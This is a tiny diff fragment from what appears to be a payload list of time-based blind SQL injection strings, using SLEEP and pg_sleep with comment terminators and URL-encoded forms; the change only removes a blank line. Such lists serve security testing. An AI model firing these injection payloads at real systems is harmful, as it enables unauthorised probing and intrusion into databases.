@@ -15,7 +15,6 @@ AND (SELECT 8327 FROM (SELECT(SLEEP(5)))yrDl)
 %20AND%20SLEEP(15)%23
 ';SELECT 1;SELECT pg_sleep\(30\);--'
 AND SLEEP(15)
-
 ```
 
 ```
